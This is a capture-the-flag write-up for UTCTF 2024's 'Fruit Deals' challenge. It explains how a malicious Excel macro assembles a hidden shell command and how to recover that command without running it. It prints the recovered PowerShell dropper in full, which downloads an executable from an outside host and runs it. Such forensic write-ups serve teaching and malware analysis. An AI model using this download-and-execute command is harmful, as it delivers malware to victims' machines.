# Fruit Deals | Reverse Engineering, Forensics | UTCTF 2024

We are given `deals.xlsm`, a macro-enabled Excel spreadsheet file, and our goal is to find the filename of the file that the program attempts to download. If you do not have Microsoft Excel, it is possible to open this file using LibreOffice.

Upon opening the file, you will hopefully see that macros were blocked from running. We can view the macro code, which I have copied into `module1.vba` and `module2.vba`. Module 1 contains code that fills the Sheet2 spreadsheet with random Base64 strings. Module 2 contains many if statements that check the values of cells in Sheet2 to build up a string. This string is then run as a shell command. If we know the contents of Sheet2, then we can reconstruct the shell command without having it actually execute.

If we open `deals.xlsm` in an archive utility such as 7zip, we will find a `sharedStrings.xml` file. I have also extracted the archive contents into the `deals` folder. This file contains a massive amount of Base64 strings, which appear to be the strings contained in Sheet2. We can now simply go through each if statement in module 2 and check if the Base64 string exists in `sharedStrings.xml` to recover the shell command.

The following command is formatted for readability.

```
poWeRsHELL -command ""
$oaK = new-object Net.WebClient;
$OrA = 'http://fruit.gang/malware';
$CNTA = 'banANA-Hakrz09182afd4';
$jri=$env:public+'\'+$CNTA+'.exe';
try{
$oaK.DownloadFile($OrA, $jri);
Invoke-Item $jri;
break;
}
catch {}
""
```

Looking at the documentation for WebClient.DownloadFile (https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-8.0), the second argument is the filename of the downloaded file. Therefore, the filename is `banANA-Hakrz09182afd4`.

```
utflag{banANA-Hakrz09182afd4}
```